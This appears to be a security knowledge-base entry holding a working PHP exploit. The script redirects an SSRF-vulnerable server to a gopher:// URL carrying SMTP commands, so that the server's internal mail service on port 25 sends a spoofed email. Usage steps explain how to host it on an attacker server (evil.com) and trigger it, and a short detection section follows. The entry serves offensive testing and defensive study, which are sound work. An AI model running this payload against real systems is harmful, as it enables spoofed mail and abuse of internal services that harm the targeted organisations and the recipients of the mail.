---
type: code
language: php
verified: true
tags:
  - gopher
  - ssrf
  - smtp
  - payload
platforms:
  - Web
  - Linux
validated: true
---

# PHP-Gopher-SMTP-Email-Spoof-Redirect

## Code

```php
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

## Description

This PHP code creates a redirect script that encodes a sequence of SMTP commands into a Gopher protocol URL, exploiting SSRF to force a victim's server to send a spoofed email via its internal SMTP service. The array defines standard SMTP verbs for greeting, sender/recipient specification, data initiation, subject/body, and termination. When the script is fetched (e.g., via SSRF), it redirects to the Gopher URL, injecting the payload over TCP to port 25.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| victim.com | Victim's domain used in HELO command | victim.com |
| admin@victim.com | Spoofed sender email address | admin@victim.com |
| sxcurity@oou.us | Target recipient email | target@example.com |
| @sxcurity! | Email subject | Confidential Update |
| Corben was here, woot woot! | Email body content | Your message here |
| . | SMTP end-of-data marker | . (fixed) |
| %0A | Line separator for SMTP CRLF | %0A (fixed) |
| 0:25 | Loopback host and SMTP port in Gopher URL | 0:25 (fixed) |

## Usage

Save as redirect.php on a controlled web server (e.g., Apache with PHP). Trigger by directing an SSRF-vulnerable endpoint to http://evil.com/redirect.php. The victim's server will follow the redirect, connect to gopher://0:25, and execute the SMTP commands to send the email. Customize the $commands array for different recipients or content; test locally with a PHP server before deployment.

## Detection

- Web server access logs showing requests to gopher:// URLs or %0A-encoded payloads.
- SMTP server logs with anomalous HELO from loopback/internal IPs or unexpected MAIL FROM domains.
- Network traffic monitoring for TCP connections from web app processes to port 25 with non-standard command patterns.
- WAF alerts on URL redirects containing gopher protocol or SMTP keywords like 'MAIL FROM', 'RCPT TO'.

## Related

- [[procedures/Gopher-SMTP-Email-Spoofing-via-SSRF]]
- [[commands/generate-gopher-smtp-payload]]
